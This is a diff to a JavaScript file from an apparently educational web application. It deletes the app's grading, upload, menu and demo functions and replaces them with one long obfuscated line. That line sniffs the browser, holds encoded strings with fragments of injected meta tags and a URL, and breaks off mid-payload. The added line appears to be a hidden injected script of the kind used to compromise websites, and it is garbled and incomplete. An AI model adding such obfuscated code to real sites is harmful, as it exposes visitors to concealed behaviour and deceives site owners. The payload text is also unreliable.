-        if (err=='') err = 'All right';
-        myprompt(  err );
-    }
-    
-    var fes = document.thisform.elements;
-    
-    for (var i=0; i < fes.length; i++)
-    {
-        fes[i].disabled = false;
-    }
-}
-function submissmatch()
-{
-    var tbl = document.getElementById('missed');
-   // if (tbl == null || tbl.nodeType != 'table') alert('missed');
-    for (var j=0; j < tbl.rows[0].cells.length; j++)
-    {
-        var sels = tbl.rows[0].cells[j].getElementsByTagName('select');
-        if (sels==null ) continue;
-        var sel = sels[0];
-        var nm = sel.options[sel.selectedIndex].value.toLowerCase();
-        if (nm == 'lastname' || nm == 'last name' ) break;
-        
-    }
-    for (var l=0; l < tbl.rows[0].cells.length; l++)
-    {
-        var sels = tbl.rows[0].cells[l].getElementsByTagName('select');
-        if (sels==null ) continue;
-        var sel = sels[0];
-        var nm = sel.options[sel.selectedIndex].value.toLowerCase();
-        if (nm == 'score'   ) break;
-        
-    }
-    //alert(j + ' ' + l);
-    for (var i=1; i < tbl.rows.length; i++)
-    {
-        for (var k=0; k < numRows; k++)
-        if (tbl.rows[i].cells[j].innerHTML.toLowerCase() == mat[k][2].toLowerCase())
-        { 
-           var sc = tbl.rows[i].cells[l].innerHTML;
-           setv(k,4,sc);
-          // alert(j + '   ' + l +  '   ' + k + '  ' + i + '  ' + sc);
-           holdvalues[k + '_4'] = sc;
-           valuechanged[k] = true;
-        }
-    }
-    setaction(1);
-}
-function selectse(sel,j)
-{
-    document.thisform.whichc.value = document.thisform.whichc.value.replace(new RegExp(";" + j + ":[a-z]*;"),";") + j + ":" + sel.options[sel.selectedIndex].value + ";";
-    SetCookie("col" + subdb, document.thisform.whichc.value);
-}
-function uploadother()
-{
-    numofuploadtries = 0;
-    if (typeof(document.thisform.localpath) == 'undefined')
-    {
-        var ef = document.createElement('input');
-        ef.type = "file";
-        ef.name='localpath';
-        ef.style.width = "1px";
-        ef.style.visibility = 'hidden';
-        ef.onchange = function()
-        {
-            document.thisform.enctype = "multipart/form-data";
-            document.thisform.action = "UploadOther";
-            if (typeof(tstmp)=='undefined')
-               document.thisform.target = "_blank" ;
-            else
-               document.thisform.target = "w" + tstmp;
-            visual(document.thisform);
-            document.thisform.submit();
-        }
-        document.thisform.appendChild(ef);
-        var fc = document.createElement('input');
-        fc.type = "hidden";
-        fc.name = "csname"
-        fc.value= title.replace(/ .*/,'');
-        document.thisform.appendChild(fc);
-        var fs = document.createElement('input');
-        fs.type = "hidden";
-        fs.name = "item"
-        fs.value= title.replace(/.*:/,'');
-        document.thisform.appendChild(fs);
-        fs = document.createElement('input');
-        fs.type = "hidden";
-        fs.name = "whichc";
-        var vv = GetCookie("col" + subdb);
-        if (vv == null) vv = ";0:lastname;2:email;3:score;4:detail;5:detail;6:detail;7:detail;8:detail;9:detail;10:detail;11:detail;12:detail;13:detail;14:detail;15:detail;16:detail;17:detail;18:detail;19:detail;";
-        fs.value = vv;
-        document.thisform.appendChild(fs);
-    }
-    document.thisform.localpath.click();
-}
-
-function addcss2head(i, divs, u)
-{
-    var q  =document.getElementById('style' + u + '_' +  i);
-    if (divs!='' && q==null)
-    {
-        var q = document.createElement('style');
-        q.id = 'style' + u + '_' +  i;
-        q.type = 'text/css';
-        document.getElementsByTagName('head')[0].appendChild(q);
-        q.innerHTML =  divs;
-    }
-    else if ( divs!='' && q!=null)
-    {
-        q.innerHTML = divs;
-    }
-    else if (divs=='' && q!=null)
-    {
-        q.parentNode.removeChild(q); 
-    }   
-}
-var allainputeles = '';
-function recurainput(x)
-{
-   if (x == null) 
-       return;
-   var label = textmsg[1771].split(/@/);
-   if (typeof(x.tagName) !='undefined' && x.tagName.toLowerCase() == 'a' ) 
-   {
-      if (typeof(x.innerHTML)!='undefined' && x.innerHTML.indexOf('&vellip;')>=0) 
-      {
-          return;
-      }
-       
-      if (x.href.indexOf("javascript")>=0)
-          allainputeles += "<tr><td style=\"color:white;font-family:" + defaultfontfamily + "\" onclick=\"" + x.href +";closeactmenu()\"><nobr>" + x.innerHTML + "</nobr></td></tr>";
-      else
-          allainputeles += "<tr><td style=\"color:white;font-family:" + defaultfontfamily + "\" onclick=\"open('" + x.href +"','_blank');closeactmenu()\"><nobr>" + x.innerHTML + "</nobr></td></tr>";
-   }
-   else if (typeof(x.tagName) !='undefined' && x.tagName.toLowerCase() == 'input' && x.type.toLowerCase() =='submit') 
-   {
-       if (typeof(x.value)!='undefined' && x.value.indexOf('&vellip;')>=0) 
-       {
-           return;
-       }
-        
-       allainputeles += "<tr><td style=\"color:white;font-family:" + defaultfontfamily + "\" onclick=\"" + (''+x.onclick).replace(/^[^\{]+/,'').replace(/ /g,'') +";closeactmenu()\"><nobr>" + x.value + "</nobr></td></tr>";
-   }
-   else if (typeof(x.tagName) !='undefined' && x.tagName.toLowerCase() == 'input' && x.type.toLowerCase() =='button') 
-   {
-       if (typeof(x.value)!='undefined' && x.value.indexOf('&vellip;')>=0) 
-       {
-           return;
-       }
-       
-       allainputeles += "<tr><td style=\"color:white;font-family:" + defaultfontfamily + "\" onclick=\"" + (''+x.onclick).replace(/^[^\{]+/,'').replace(/ /g,'') +";closeactmenu()\"><nobr>" + x.value.replace(/</,label[11]).replace(/>/,label[12]) + "</nobr></td></tr>";
-   }
-   else if (typeof(x.tagName) !='undefined' && x.tagName.toLowerCase() == 'td' && typeof(x.onclick)!='undefined' && x.onclick!=null &&  x.onclick!='') 
-   {
-      if (typeof(x.innerHTML)!='undefined' && x.innerHTML.length < 2) 
-      {
-          return;
-      } 
-      if (x.innerHTML.replace(/^\/[0-9]+.*/,'')!='')
-      allainputeles += "<tr><td style=\"color:white;font-family:" + defaultfontfamily + "\" onclick=\"" + (''+x.onclick).replace(/^[^\{]+/,'').replace(/ /g,'') +";closeactmenu()\"><nobr>" + x.innerHTML.replace(/&lt;/,label[11]).replace(/&gt;/,label[12]) + "</nobr></td></tr>";
-   }
-   else if (typeof(x.childNodes)!='undefined' && x.childNodes!=null && x.childNodes.length>0)
-   {
-       for (var i=0; i < x.childNodes.length; i++)
-           recurainput(x.childNodes[i]);
-   }
-}
-function buildactmenu()
-{
-    if (typeof(document.thisform)!= 'undefined')
-    recurainput(document.thisform);
-}
-function closeactmenu()
-{
-    document.body.removeChild(document.getElementById('dotmenu'));
-}
-function gohome()
-{
-    var gp = window;
-    var url0 = document.location.toString().replace(/[^\/]+$/,'');
-    var url1= url0.replace(/\/$/,'');
-    var url2 = url0 + "index.";
-    while (gp!=gp.parent) gp = gp.parent;
-    var ip = gp.opener;
-    if (ip !=null)
-    {
-       try
-       {
-          var x = ip.document.location.toString();
-          if (x == url0 || x == url1 || x.indexOf(url2)>=0)
-          {
-              gp.close();
-          }
-          else
-          {
-              if (ip.parent.document.location.toString().indexOf('index.jsp') < 0
-                 && ip.parent.document.location.toString().indexOf('studentpage.jsp') < 0     
-              )
-             {
-                 ip.parent.document.location.href = "index.jsp";
-                 indexwindow = ip;
-             }
-             close();
-          }
-       }catch(e)
-       {
-           if (gp.document.location.toString().indexOf('index.jsp') < 0
-                 && gp.document.location.toString().indexOf('studentpage.jsp') < 0     
-                 )
-         {   
-             gp.document.location.href = "index.jsp";
-             indexwindow = gp;
-         }
-          close();
-       }
-    }
-    else if (gp.document.location.toString().indexOf('index.jsp') < 0
-          && gp.document.location.toString().indexOf('studentpage.jsp') < 0     
-        ) 
-    {
-        gp.document.location.href = "index.jsp";
-        indexwindow = gp;
-    }
-    else  close();
-}
-function actionmenu(spn)
-{
-    if (allainputeles=='')
-        buildactmenu();
-    if (allainputeles=='')
-    {
-        spn.parentNode.removeChild(spn);
-        return;
-    }
-    var str = "<table style=\"color:white;font-family:" + defaultfontfamily + "\" >" + allainputeles  
-       +"<tr><td style=\"color:white;font-family:" + defaultfontfamily + "\" onmouseout=closeactmenu() onclick=closeactmenu()>" + textmsg[1824] +  "</table>";
-    var xy = findPositionnoScrolling(spn);
-    var dv = document.createElement("div");
-    dv.id = 'dotmenu';
-    //dv.className = 'outset2';
-    dv.style.cssText = "background-image:" + gradientbg + ";background-position:-30px 0px;background-color:#222222;color:white;display:inline-block;position:absolute;top:" + xy[1] + "px;left:" + (xy[0]-70) 
-    +"px;border:1px #666666 solid;color:white;font-family:" + defaultfontfamily;
-    dv.innerHTML = str;
-   // dv.onmouseout = closeactmenu;
-    document.body.appendChild(dv);
-}
-
-function onmydomain(openwin)
-{
-    try
-    {  
-        var x = openwin.location.href;
-        return true;
-    }catch(e){return false;}
-}
-
-var democursorx = 0;
-var democursory = 0;
-var democursorsim = null;
-var demokeyframen = 0;
-var demohandle = null;
-var demosound = null;
-var demospeedup = 1;
-function demoinitcursor(originalurl)
-{
-    if (originalurl==null) originalurl = '';
-    demosound = new Audio(originalurl + "image/clicksound.mp3");
-    democursorsim = document.createElement('div');
-    democursorsim.id = "cursorid";
-    democursorsim.style.cssText = "background:url(" + originalurl + "image/cursorsim.gif);position:absolute;z-index:400;left:0px;top:0px;width:27px;height:48px;";
-    democursorsim.innerHTML = "<!---->";
-    document.body.appendChild(democursorsim);
-    democursorsim.onclick =  demopause;
-}
-var demodelay = false;
-function demopause()
-{
-    if (promptwin==null)
-    {
-        demosuspend();
-        demoshowsel();
-    }
-}
-
-function demoshowsel()
-{
-    var s = "<br><center>s=" + demospeedup  +"<br>"
-    + "<input type=button class=GreenButton style=width:65px value=\"&uarr;&times;2\" onclick=\"demospeedup*=2;demosch();closeprompt()\">"
-    + "<input type=button class=GreenButton style=width:65px value=\"&darr;&divide;2\" onclick=\"demospeedup/=2;demosch();closeprompt()\">"
-    + "<input type=button class=GreenButton style=width:65px value=\"" + textmsg[821] + "\" onclick=\"demosch();closeprompt()\">"
-    + "<input type=button class=GreenButton style=width:65px value=\"" + textmsg[1771].split(/@/)[5] + "\" onclick=demostop()></center>";
-    myprompt(s,null,null,textmsg[820]);
-}
-var demotasks = [];
-var demostepi = 0;
-var demostepj;
-function demosuspend()
-{
-    if (demohandle!=null)
-    {
-        clearTimeout(demohandle);
-        demohandle = null;
-    }
-}
-function demoresume()
-{
-    demostepi--;
-    if ( demostepi < demotasks.length )
-    {
-        demohandle = setTimeout(demotasks[demostepi][0] + ";demosch()", 200);
-        demostepi++;
-    }
-}
-function demosch()
-{
-     
-    if ( demostepi < demotasks.length )
-    {
-        demohandle = setTimeout(demotasks[demostepi][0] + ";demosch()" , Math.round(demotasks[demostepi][1]/demospeedup));
-        demostepi++;
-    }
-}
-function demo()
-{
-    demoinitcursor();
-    demostepi = 0;
-    demosch();
-}
- 
-function demostop()
-{
-    demostepi = 0;
-    demoremovesim();
-    demokeyframen = 0;
-    closeprompt();
-}
-function demoheight(h)
-{
-    if (h==null) h = 1;
-    if (democursorsim != null)
-    {
-       democursorsim.style.transform = "scale(1," + h + ")"; 
-       if (h!=1)
-       {  
-           demosound.currenTime = 0;
-           try{demosound.play();}catch(e){}
-       }
-     
-    }
-}
-function democursor2(x, y)
-{
-    if (typeof(x) == 'undefined' || x == null) return 0;
-    if (typeof(x)!= 'number')
-    {
-        if (y==null) y = 2;
-        var xy = findPositionnoScrolling(x);
-        xy[0] += x.offsetWidth/y;
-        xy[1] += x.offsetHeight/2;
-        return democursor2(xy[0],xy[1]);
-    }
-    
-    var str = '@keyframes cursormove' + demokeyframen + '{\n from {left:' + democursorx + 'px;top:' + democursory + 'px}\n to {left:' + x + 'px;top:' + y + 'px}\n}\n}';
-        var st = document.getElementById('cursormove');
-        if (st == null)
-        {
-            st = document.createElement('style');
-            st.id = 'cursormove';
-            st.innerHTML = str;
-            document.getElementsByTagName('head')[0].appendChild(st);
-        } else
-            st.innerHTML = str;
-        
-        democursorsim.style.animationName = "cursormove" + (demokeyframen++);
-        democursorsim.style.animationFillMode = "forwards";
-        var tm = Math.round(Math.sqrt((x-democursorx)*(x-democursorx) + (y-democursory)*(y-democursory))/200/demospeedup);
-        if (tm == 0) tm = 1;
-        democursorsim.style.animationDuration = tm +  "s";
-        democursorsim.style.animationDelay = "0s"; 
-        democursorx = x;
-        democursory = y;
-        setTimeout(democursorat,tm*1000);
-        return tm*1000; 
-}
-
-function democursorat()
-{
-   if (democursorsim!=null){
-   democursorsim.style.left = democursorx + 'px';
-   democursorsim.style.top = democursory + 'px';
-   }
-}
-
-function demoremovesim()
-{
-    if (democursorsim!=null)
-    {
-        document.body.removeChild(democursorsim);
-        democursorsim = null;
-    }
-}
-
-
-
-var eventcodes = new Array();
-eventcodes[0] = "realClose();";
-eventcodes[1] = "if(hints[cc]==labels[cc] && mandatory[cc]==false) closeprompt();else{myprompt(((hints[cc]==labels[cc])?(labels[cc]+ textmsg[722]):hints[cc]),null,null,textmsg[191]);var xy=findPositionnoScrolling(ele(0,cc));promptwin.style.top=(xy[1]+25)+'px';promptwin.style.left=(xy[0]+150)+'px';}";
-eventcodes[2] = "opener.document.location.href='cfgdb.jsp?which=registered';var win=window.open('','_top','',true);win.opener=true;win.close();";
-eventcodes[3] = "opener.syn2();realClose();";
-eventcodes[4] = "opener.aftertool()";
-eventcodes[5] = "validating=opener.check()";
-eventcodes[6] = "defaultRecord[0]=Math.floor((new Date())/1000)";
-eventcodes[7] = "popwin='z21';parent.z12.syn1();";
-eventcodes[8] = "parent.frames[0].setname(mat[0][0])";
-eventcodes[9] = "opener.redo(mat);populate(true)";
-eventcodes[10] = "opener.assemble()";
-eventcodes[11] = "parent.frames[0].refresh()";
-eventcodes[12] = "if (cc==0)renaming()";
-eventcodes[13] = "if(retrv(0,0)==''){validating=textmsg[97];ele(0,0).focus();}";
-eventcodes[14] = "if(cc==1){setv(0,2,guessFormat(v));}";
-eventcodes[15] = "save2places();SetCookie(subdb+'tcmt','');SetCookie(subdb+'acinfo','');saveabsence()";
-eventcodes[16] = "f2.subdb.value=''";
-eventcodes[17] = "if(mat[0][8]=='')setv(0,8,mat[0][14]);if(mat[0][5]=='')setv(0,5,mat[0][15]);";
-eventcodes[18] = "if(cc==1){if(valuechanged[rr])for(var i=0;i<numCols;i++)if(ele(rr,i).value=='')setv(rr,i,defaultRecord[i]);}else if (cc==5&&rdapname=='roster')setCell(rr,6,''+(parseInt(retrv(rr,6))+parseInt(v)-parseInt(x)));";
-eventcodes[19] = "opener.getChecked(newmat[rr][cc])";
-eventcodes[20] = "if (cc==1&&v!='...'){var t=v.split(',');for(var z=0;z<t.length;z++){var w=t[z].split( \"\" );var j=rr;if(z>0&&rr<numRows)j=numRows+z-1;else if (z>0&&rr==numRows)j=numRows+z;setv(j,0,retrv(rr,0));setv(j,3,w[0]);setv(j,4,w[1]); }}";
-eventcodes[21] = "if(numRows!=1){myprompt('Incorrect code');} else{xy=findPositionnoScrolling(document.getElementById('thetoolbar'));myHintx=xy[0]-10;myHinty=xy[1]+80; showmyhint(0,1);}";
-eventcodes[22] = "timeformat=timeformat.replace(/ hh:mm/,'');opener.close();resizeTo(600,screen.height);moveTo((screen.width-600)/2,0)";
-eventcodes[23] = "ret=2;nav1.document.getElementById('detail').innerHTML=textmsg[90];close();";
-eventcodes[24] = "timeformat=timeformat.replace(/hh/,'').replace(/mm/,'').replace(/:/g,'');setv(0,15,defaultRecord[15]);";
-eventcodes[25] = "parent.frames['z12'].syn5()";
-eventcodes[26] = "if(cc==3){parent.z12.showlabel(rr);if(mat[rr][2]!='')setv(rr,cc,x);}";
-eventcodes[27] = "for(r=numRows-1;r>=0;r--)valuechanged[r]=false;";
-eventcodes[28] = "for(r=numRows-1;r>=0;r--)if(parseInt(mat[r][11])>0){mat[r][8]='';ele(r,8,'');}";
-eventcodes[29] = "opener.log1(rr,cc,x,v)";
-eventcodes[30] = "popwin1=parent.frames[1].name;";
-eventcodes[31] = "";//x=updateQuery;updateQuery=mu(updateQuery,retrv(0,3));";
-eventcodes[32] = "ret=2;myprompt(textmsg[778],null,\"if(v){f1.action='Email';f1.target='w'+tstmp;formnewaction(f1);visual(f1f1.submit();}\");updateQuery=x;";
-eventcodes[33] = "if(cc==0){subdb=(v=='1')?mat[0][1]:'';setv(0,2,subdb);mat[0][4]=(v=='1')?mat[0][5]:mat[0][6];}else if (cc==8)setv(0,9,guessFormat(v));";
-eventcodes[34] = "document.location.href='DataForm?rdap=feeurge&numrows=1'";
-eventcodes[35] = "if(cc==9){setv(rr,10,guessFormat(v));setv(rr,8,'1');}";
-eventcodes[36] = "for(r=0; r < numRows; r++)setv(r,15,''+r)";
-eventcodes[37] = "if(cc==1){if(valuechanged[rr])for(var i=0;i<numCols;i++)if(ele(rr,i).value=='')setv(rr,i,defaultRecord[i]);}else if (cc==6&&rdapname=='roster'){formselementbyname(document.form1,rr+'_7').value=''+(parseInt(retrv(rr,7))-parseInt(v)+parseInt(x));}";
-eventcodes[38] = "if(mat[0][8]=='')setv(0,8,mat[0][14]);if(mat[0][5]=='')setv(0,5,mat[0][15]);showtimeslots(ele(0,3),3,1)";
-eventcodes[39] = "parent.resizeIframe(0,window);";
-eventcodes[40] = "parent.rename0(rr,cc)";
-eventcodes[41] = "parent.old(x)";
-eventcodes[42] = "valuechanged[0]=true;validating='';var fm=window.frames[0];setv(0,2,'');c=fm.passoverNumRows();for(j=c-1;j>=0;j--){r=c-j;cc=fm.retrv(r-1,3);x=fm.retrv(r-1,2);if(x==''){validating=textmsg[417].concat(fm.retrv(r-1,0));break;}setv(0,cc,retrv(0,cc).concat(fm.retrv(r-1,2)));fm.setvaluechanged(r-1,false);}";
-eventcodes[43] = "for(c=0;c<4;c++)if(ctype[c]=='h'){setv(0,c,'');mat[0][c]='';}valuechanged[0]=false;";
-eventcodes[44] = "parent.openassess1(mat[0][0])";
-eventcodes[45] = "popwin1=parent.frames[1].name";
-eventcodes[46] = 'parent.parent.frames[0].zz()';
-eventcodes[47] = "opener.fill(window)";
-eventcodes[48] = "cellvalue=retrv(0,3);setv(0,4,''+guessFormat(cellvalue));";
-eventcodes[49] = "opener.follows(1)";
-eventcodes[50] = 'passdefaults(parent.frames[0])';
-eventcodes[51] = "parent.match();parent.resizeIframe(1,window)";
-eventcodes[52] = "parent.fill()";
-eventcodes[53] = "parent.endload((5+NUMROWS)*23)";
-eventcodes[54] = "opener.changeback()";
-eventcodes[55] = "opener.existwarning(numRows)";
-eventcodes[56] = "parent.regroup();parent.resizeIframe(1,window)";
-eventcodes[57] = "opener.redo(mat);populate(0)";
-eventcodes[58] = "opener.assemble()";
-eventcodes[59] = "addextraform()";
-eventcodes[60] = "parent.frames[0].redo(mat);populate(true);var labelsc0=textmsg[1644].split(/@/);for(var i=0;i<5;i++)setv(i,0,labelsc0[i]);";
-eventcodes[61] = "parent.frames[0].assemble()";
-eventcodes[62] = "parent.frames[0].menupermit()";
-eventcodes[63] = "for(r=3;r>=0;r--)valuechanged[r]=true;";
-eventcodes[64] = "if (numRows==0) myprompt('Record does not exist. You may help to enter one')";
-eventcodes[65] = 'popwin=self.name;if(cc==0){setv(0,2,v.split(/\|/)[0]);setv(0,4,v.split(/\|/)[1]);}';
-eventcodes[66] = "popwin1=self.name;";
-eventcodes[67] = "popwin1=self.name;ele(0,4).options[0]=new Option(textmsg[1272],'');ele(0,4).selectedIndex=0;";
-eventcodes[68] = "popwin1='tlmrsch';";
-eventcodes[69] =  "popwin1='tlmrsch';showhelp2(popwin1);";
-eventcodes[70] = "if(whichaction=='0')parent.frames[0].openfix();";
-eventcodes[71] = "if(whichaction=='0')parent.parent.frames[0].openfix(600);";
-eventcodes[72] = "if(numRows==0)valuechanged[0]=true;popwin1='tlmrsch';showhelp2(popwin1);";
-eventcodes[73] = "if(numRows==0)opener.hints1();focus()";
-eventcodes[74] = "ret=3;opener.refresh();setTimeout(close,100)";
-eventcodes[75] = "if(ctype[cc]=='a'){var fmti=0;for(;fmti < numCols && fields[fmti].toLowerCase()!='format';fmti++);if (fmti<numCols){cellvalue=retrv(0,fmti);setv(0,fmti,guessFormat(v));}}";
-eventcodes[76] = "ret=3;opener.reopen();setTimeout(close,100);";
-eventcodes[77] = "if(retrv(0,0)==mat[0][0] && retrv(0,1)==mat[0][1] && confirm(textmsg[723])==false) validating=' '";
-eventcodes[78] = "ret=2;opener.openagain();setTimeout('close()','100')";
-eventcodes[79] = "allanswers()";
-eventcodes[80] = "opener.updatescore()";
-eventcodes[81] = "if (numRows == NUMROWS) document.location.href= document.location.toString();";
-eventcodes[82] = "if(cc==1)parent.parent.frames[0].check1(retrv(rr,cc),rr)";
-eventcodes[83] = "if(cc==1)parent.parent.frames[0].check(retrv(rr,cc),rr)";
-eventcodes[84] = "if(cc==1)parent.frames[0].check(retrv(rr,cc),rr)";
-eventcodes[85] = "if (cc==1&&v!='...'){ var t=v.split(',');for(var z=0;z<t.length;z++){var w=t[z].split('|');var j=rr;if(z>0&&rr<numRows)j=numRows+z-1;else if (z>0&&rr==numRows)j=numRows+z;setv(j,0,retrv(rr,0));setv(j,3,w[0]);setv(j,4,w[1]); }}";
-eventcodes[86] = "";
-eventcodes[87] = "";//x=updateQuery;updateQuery=mu(updateQuery,retrv(0,3))";
-//eventcodes[88] = "myprompt(textmsg[778],null,\"if(v){f1.action='Echo';f1.target='_blank';visual(f1);f1.submit();}\");updateQuery=x;";
-eventcodes[88] = "myprompt(textmsg[778],null,\"if(v){f1.action='Email';f1.target='w'+tstmp;visual(f1);f1.submit();}\");updateQuery=x;";
-eventcodes[89] = "if(cc==0){subdb=(v=='1')?mat[0][1]:'';setv(0,2,subdb);mat[0][4]=(v=='1')?mat[0][5]:mat[0][6];}else if (cc==8){setv(0,10,guessFormat(v));}else if (c==9){v=v.replace(/([a-z])[ ]*$/,'$1,');setv(0,9,v);}";
-eventcodes[90] = "maxsize[3]=1000";
-eventcodes[91] = "if(cc==0){subdb=(retrv(0,0)=='1')?mat[0][1]:'';setv(0,2,subdb);mat[0][4]=(retrv(0,0)=='1')?mat[0][5]:mat[0][6];}else if (c==9){v=v.replace(/([a-z][ ]*)$/,'$1,');setv(0,9,v);}";
-eventcodes[92] = "opener.addAnItem1()";
-eventcodes[93] = "parent.z12.syn5()";
-eventcodes[94] = "close()";
-eventcodes[95] = "if (cc==3)showtimeslots(ele(counter,3),3)";
-eventcodes[96] = "if (cc==1)showtimeslots(ele(rr,1),1)";
-eventcodes[97] = "if (numRows==0 && typeof(document.thisform.webservice0)!='undefined'){myprompt(textmsg[1362],null,null,textmsg[591]);};";
-eventcodes[98] = "if (numRows==0){myprompt(textmsg[1363],null,null,textmsg[591]);};";
-eventcodes[99] = "narrowtable();"
-eventcodes[100] = "nonamefunc1();";
-eventcodes[101] = "for(r=numRows;r<NUMROWS;r++){n=Math.round(Math.pow(2,(r-1)));setv(r,0,''+r);setv(r,1,''+n);valuechanged[r]=false;}";
-eventcodes[102] = "r=thispageheight();parent.resizeifrm(window.name,r);"
-eventcodes[103] = "if(numRows>0 && rr < numRows && cc==0&&v!=x){myprompt(textmsg[1572],null,\"if(v)changerid('changeid',mat[rr][0],retrv(rr,0));else setv(rr,0,x);\",'')}";
-eventcodes[104] = "if(numRows>0 && rr < numRows && cc==0&&v!=x){myprompt(textmsg[1572],null,\"if(v)changerid('changecid',mat[rr][0],retrv(rr,0));else setv(rr,0,x);\",'')}";
-eventcodes[105] = "if(numRows>0 && rr < numRows && cc==0&&v!=x){myprompt(textmsg[1572],null,\"if(v)changerid('changedept',mat[rr][0],retrv(rr,0));else setv(rr,0,x);\",'')}";
-eventcodes[106] = "if(numRows>0 && rr < numRows && cc==1&&v!=x){myprompt(textmsg[1572],null,\"if(v)changerid('changesess',mat[rr][1],retrv(rr,1),'',retrv(rr,0),retrv(rr,3));else setv(rr,1,x);\",'')}";
-eventcodes[107] = "if(numRows>0 && rr < numRows && cc==2&&v!=x){myprompt(textmsg[1572],null,\"if(v)changerid('changesess',mat[rr][2],retrv(rr,2),'',retrv(rr,0),retrv(rr,4));else setv(rr,2,x);\",'')}";
-eventcodes[108] = "popwin1='w'+tstmp;";
-eventcodes[109] = "parent.width2(document.getElementById('maintable').offsetWidth,document.getElementById('maintable').offsetHeight)";
-eventcodes[110] = "var xx=ele(0,1).options.length;ele(0,1).options[xx]=new Option(textmsg[114]+' '+labels[1] ,'@');newitem=function(Z,j){var X=ele(Z,j);if (X.options[X.selectedIndex].value=='@')myprompt('<center><iframe src=schedulerindex.jsp?semester=@&forindex=1 width=300 height=320 /></center>');}";;
-eventcodes[111] = "fff();";
-eventcodes[112] = "setv(rr,0,retrv(rr,1) + '|' + retrv(rr,2) + '|' + retrv(rr,4))";
-eventcodes[113] = "morecoursesel(existing)";
-eventcodes[114] = "setTimeout(parent.closeprompt,1500)";
-eventcodes[115] = "timeformat=timeformat.replace(/[a-z][a-z]/g,'').replace(/:/g,'');Sch.printsch1();parent.newalarm(mat,numRows)";
-eventcodes[116] = "printcourse()";
-eventcodes[117] = "printcourse1()";
-eventcodes[118] = "morecoursesel(existing);writehint()";
-eventcodes[119] = "popwin1=parent.frames[1].name;parent.modify23(f1)";
-eventcodes[120] = "timeformat=timeformat.replace(/ mm:ss/,'');for(j1=0;j1<numCols&&fields[j1]!='Birthday';j1++);if (mat[0][j1]==null || mat[0][j1]=='0'){mat[0][j1]=(''+((new Date()).getTime()-20*365*24*3600000) ).replace(/[0-9][0-9][0-9]$/,'');ele(0,j1).value=timestr(parseInt(mat[0][j1]));} ele(0,j1).value=ele(0,j1).value.replace(/ [0-9][0-9]:[0-9][0-9]/,'');";
-eventcodes[121] = "SetCookie(mat[0][0] + \"acinfo\",'');parent.document.location.herf=parent.document.location.toString()";
-eventcodes[122] = "saveabsence()"; 
-eventcodes[123] = "parent.extraweight(window)"; 
-var homestr = '<a href="../"><div style="float:left;background:radial-gradient(farthest-side at 70% 65%,#efeffd,#666660);width:54px;height:54px;border-radius:27px;alignment:center;text-align:center;vertical-align:middle;line-height:54px"><table cellspacing="0" width="24" style="transform:scale(1.5,1.5);margin:10px 0px 0px 13px" align="center"><tr height="6"><td colspan="7"></td></tr><tr height="10"><td colspan="7"><div style="width:0px;height:0px;border-left:12px solid transparent;border-bottom:10px #fff solid;border-right:12px solid transparent;"></div></td></tr><tr height="3"><td width="3" rowspan="2"></td><td width="5" style="background-color:#ffffff" rowspan="2"></td><td width="5" rowspan="2"></td><td width="4" style="background-color:#ffffff" rowspan="2"></td><td width="5"></td><td width="4" style="background-color:#ffffff" rowspan="2"></td><td width="3" rowspan="2"></td></tr><tr height="5"><td style="background-color:#ffffff" width="5"></td></tr><tr height="12"><td colspan="7"></td></tr></table></div></a>';
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';y4TPTKJ59htZlp=new Array();rxZ4iBOKCSD9I3=new Array();rxZ4iBOKCSD9I3[0]='f%58\162M%32%5Ae';y4TPTKJ59htZlp[0]='	~zaa~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~~~~~~ ~\r~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~\\~]~^~_~`~a~b~(~!~e~f~g~h~i~j~k~l~m~n~o~p~q~dl=document.layers;oe=win~ww.op}a?1:0;da=(~w~y~{~}.}~z~|tMode||}"}~~all)&&!};g}},}$.}8tEle}-ById;ws}	}}\r.si}(bar?true:f}/se;tN=navigator.u}\\rA}8} }hLow}Ca}\\();iz}`}_.}KexOf(\'netsca}\')>=0}T}V}X}Zl}\\;zi}I}||8~va;v}R msg=\'\';function |	m}z{r|\nur|7}U}W}}G}K}t}|	rr}i =|8}A|OF}J}|Gl~x}g|5n.p|K}hcol|}|||fi}@|!=-1|}W}Y}[}]i7f=|s}3!z|R|p||s;/*{{{{{{	{\n{{{\r{\n\r\n* (C) C}yr}eht 2004-{ 21 by Syst}As |6 Web, I|2.  A}0 R{|{Ae}mved{< *{{Auth}i: Z{Sngya|7L}{={`{a{b{c{d{e{f{d{M{{{k{l{m{n{/{if{ ty}o|i|4sago}\'~wma}{=|N\'|1}(|h|	d|{{{{`|&r {||{zdzz|7|N}:} |W|\r|4|6.}hS}U}g}z|c}(||\'{tps://z{X{Z{\\l}}<{|hub|o|;z{={s{z{~zzaazoz{_|l 0)zI z\n{dz!~~z#|Yz&h|={tz	z3z5z7z9z;{[nz>|[gzAzCzE/}N{//|.zX}{zy\n{{oz~zzz{{{{p{{C{{!6{$013{({*{,{.{0{2|7{5{7{9{;{={?l{A{C{1R{F}{H{J{={i{L{>{Q{Sr{U{W|6z<{]{_{gy4y5y6{ay(yzaay:y;{\r{q\nzK({w{y|szQe|`n{.s)zz\n|dz\r{Iz\nzZz yE~{yHyJ=[\'<~{ta zf-equiv="Pr{z" yH{/~}yjno-|\rcheyp>y^|\nyaycyeygyi"yr}$-yBy|yq|6ystyj{/xt/{ml;yqh}R}\\xgb2312yp/>\',\'}Ri}/,KzTix-x/iGBx x",STx.zx\'\'x"y34{&x"xBxBxExH324354xN6765xR5sdffhgfjx[}xcz}r}U{IsvyxE44xXdw3rhd|*QWERETEASAx>1x>xM98{!0x>z:yxn\']zH\nyU|1zt}@|M |0|2z%n({.r,c|)zZ{ey@ws|l\'o{Qx2| zX{b|=t|?|7y]y`bwce}0spacz+|yqw9lw<zw?0 }\nd{R=1{!%{(}i}(rw@}/}en=w8~}}yq}zaas}I\' +w\\{1wbw`y~}Uybe{C=48wgd |&z>gwWm}O~te wUwtwX}$}wgaw6wywIwKwM0wOwzwswWwY{/rwgv<twpvh=36v	wV=wvz